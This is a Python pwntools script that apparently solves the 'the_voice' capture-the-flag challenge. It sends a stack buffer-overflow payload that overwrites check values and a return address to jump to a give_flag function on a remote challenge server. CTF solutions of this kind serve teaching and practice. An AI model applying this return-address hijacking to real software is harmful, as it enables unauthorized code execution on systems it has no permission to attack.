#!/usr/bin/env python3

from pwn import *

exe = ELF("./the_voice_patched")

context.binary = exe

def pwn(p):
    print(p.recvuntil(b'give it to you.'))
    print(p.recvline())

    give_flag = 0x4011fb
    payload =  p64(0x3531)
    payload += b'\x00' * 16
    payload += p64(0x27cf)
    payload += b'A' * 8
    payload += p64(give_flag)

    p.sendline(payload)
    print(p.recvline())

def conn():
    args.LOCAL = False
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.umdctf.io", 31192)

    return r


def main():
    r = conn()

    # good luck pwning :)
    pwn(r)

    #r.interactive()


if __name__ == "__main__":
    main()
